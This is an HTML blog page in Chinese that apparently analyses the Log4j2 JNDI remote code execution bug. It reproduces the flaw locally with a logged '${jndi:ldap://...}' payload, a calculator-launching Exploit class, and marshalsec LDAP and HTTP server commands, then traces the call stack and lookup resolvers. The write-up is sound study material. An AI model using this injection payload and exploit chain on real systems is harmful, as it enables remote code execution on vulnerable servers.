@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="漏洞预警发布的第一天，网上就已经有了poc了，也算是火出圈了，受影响的服务真的是太多了。本打算第二天调试后便写一写记录，结果一直因为各种事拖到今天，读研真是太难了。  复现从零开始，Steps 从IDEA里新建一个project，选择maven项目，不使用模板，默认创建就好。然后新建需要的测试类，exp的类可以随意放，这里我为了方便就放到同一目录下了，这是最终的目录结构   其中log4j代码：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VA - Log4j2 RCE">
+<meta property="og:url" content="http://w1mps.github.io/2021/12/15/Log4j%20Analysis/index.html">
+<meta property="og:site_name" content="Trashbox 4 outx!">
+<meta property="og:description" content="漏洞预警发布的第一天，网上就已经有了poc了，也算是火出圈了，受影响的服务真的是太多了。本打算第二天调试后便写一写记录，结果一直因为各种事拖到今天，读研真是太难了。  复现从零开始，Steps 从IDEA里新建一个project，选择maven项目，不使用模板，默认创建就好。然后新建需要的测试类，exp的类可以随意放，这里我为了方便就放到同一目录下了，这是最终的目录结构   其中log4j代码：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214173249211.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175110927.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175019635.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175344848.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193423862.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193516207.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214194632121.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214200656183.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201000993.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201314019.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204056033.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204305707.png">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204552398.png">
+<meta property="article:published_time" content="2021-12-15T12:42:40.000Z">
+<meta property="article:modified_time" content="2021-12-14T12:55:47.042Z">
+<meta property="article:author" content="outx">
+<meta property="article:tag" content="Supply Chain Attack">
+<meta property="article:tag" content="1day">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214173249211.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VA - Log4j2 RCE</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/12/07/POSTER%20-%20Construct%20macOS%20Cyber%20Range%20for%20Red%20-%20Blue%20Teams/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&text=VA - Log4j2 RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&is_video=false&description=VA - Log4j2 RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VA - Log4j2 RCE&body=Check out this article: http://w1mps.github.io/2021/12/15/Log4j%20Analysis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&name=VA - Log4j2 RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&t=VA - Log4j2 RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">2.</span> <span class="toc-text">调用栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        VA - Log4j2 RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">outx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-15T12:42:40.000Z" itemprop="datePublished">2021-12-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Vulnerability-Analysis/">Vulnerability Analysis</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/1day/" rel="tag">1day</a>, <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/Supply-Chain-Attack/" rel="tag">Supply Chain Attack</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>漏洞预警发布的第一天，网上就已经有了poc了，也算是火出圈了，受影响的服务真的是太多了。本打算第二天调试后便写一写记录，结果一直因为各种事拖到今天，读研真是太难了。</p>
+</blockquote>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>从零开始，Steps</p>
+<p>从IDEA里新建一个project，选择maven项目，不使用模板，默认创建就好。然后新建需要的测试类，exp的类可以随意放，这里我为了方便就放到同一目录下了，这是最终的目录结构</p>
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214173249211.png" alt="image-20211214173249211" style="zoom:50%;" />
+
+<p>其中log4j代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Logger log = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:9999/Exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Exploit代码（简单弹个计算器）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用marshalsec进行jndi注入，首先javac编译生成class文件，再启动一个临时http服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175110927.png" alt="image-20211214175110927" style="zoom:50%;" />
+
+<p>然后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/\#Exploit 9999</span><br></pre></td></tr></table></figure>
+
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175019635.png" alt="image-20211214175019635" style="zoom: 50%;" />
+
+<p>最后执行log4j:main()</p>
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214175344848.png" alt="image-20211214175344848" style="zoom: 50%;" />
+
+<p>这里有一个很奇怪的情况，python启起来的http服务并不会显示marshalsec转发过来的请求</p>
+<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193423862.png" alt="image-20211214193423862" style="zoom:33%;" />
+
+<p>入口函数为logIfEnabled，除了error调用之外，还有info、debug、fatal、log、trace、warn</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214193516207.png" alt="image-20211214193516207"></p>
+<p>但在测试后发现，以trace为例子，在这里的intLevel会导致返回false，从而直接结束整个代码流程</p>
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214194632121.png" alt="image-20211214194632121" style="zoom:50%;" />
+
+<p>这里的this.intLevel应该是默认的200，而level.intLevel具体为：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Standard Level</th>
+<th align="left">intLevel</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">OFF</td>
+<td align="left">0</td>
+</tr>
+<tr>
+<td align="left">FATAL</td>
+<td align="left">100</td>
+</tr>
+<tr>
+<td align="left">ERROR</td>
+<td align="left">200</td>
+</tr>
+<tr>
+<td align="left">WARN</td>
+<td align="left">300</td>
+</tr>
+<tr>
+<td align="left">INFO</td>
+<td align="left">400</td>
+</tr>
+<tr>
+<td align="left">DEBUG</td>
+<td align="left">500</td>
+</tr>
+<tr>
+<td align="left">TRACE</td>
+<td align="left">600</td>
+</tr>
+<tr>
+<td align="left">ALL</td>
+<td align="left">Integer.MAX_VALUE</td>
+</tr>
+</tbody></table>
+<p>所以网上说的大部分能触发是有问题的（当然，修订过配置的另说🥺），默认情况下fatal和error可以触发</p>
+<p>言归正传，根据调用栈，跟着走一遍大概就能理清楚整个流程</p>
+<p>这里主要记录下核心的关键点，一是format函数</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214200656183.png" alt="image-20211214200656183"></p>
+<p>主要是看到下断点这里，他对 **${**这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发下面流程中的替换机制(this.config.getStrSubstitutor.replace)</p>
+<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201000993.png" alt="image-20211214201000993" style="zoom:50%;" />
+
+<p>来看详细的函数内初始化情况</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214201314019.png" alt="image-20211214201314019"></p>
+<p>可以看到其定义了prefixMatcher为[$, {]，suffixMatcher为[}]，这里的目的是把${}中间的字符串抠出来，以将varName的值赋为jndi:ldap://127.0.0.1:9999/Exploit，并随后传递给this.resolveVariable()，而这个函数又做了一件什么事呢，看下面</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204056033.png" alt="image-20211214204056033"></p>
+<p>支持的resolver有date、java、marker、ctx、lower、upper、jndi、main、jvmrunargs、sys、env、log4j，其中lower和upper也是后面用来绕过常用的方法，更进一步</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204305707.png" alt="image-20211214204305707"></p>
+<p>可以看到这里是写死了匹配第一个:的，作为prefix，然后会对应去找其实现，我这里是jndi，故后续都是走的JndiLookup类，后续如图，直到调用原生lookup函数</p>
+<p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20211214204552398.png" alt="image-20211214204552398"></p>
+<p>至此结束</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这应该算得上是我第一次学习和调试Java 1day，有很多都是边学边查边理解边写，也许还有很多理解有误的地方，等以后精进了之后再回来读和反思，这也是记录的目的之一。只希望自己能够坚持下来，一定能有收获！加油🤩</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">2.</span> <span class="toc-text">调用栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&text=VA - Log4j2 RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&is_video=false&description=VA - Log4j2 RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VA - Log4j2 RCE&body=Check out this article: http://w1mps.github.io/2021/12/15/Log4j%20Analysis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&title=VA - Log4j2 RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&name=VA - Log4j2 RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2021/12/15/Log4j%20Analysis/&t=VA - Log4j2 RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->
+
+    <div class="footer-center">
+      Copyright &copy;
+      
+      
+      2021
+      Powered by
+      outx
+      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
+    </div>
+  
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  <br>
+
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
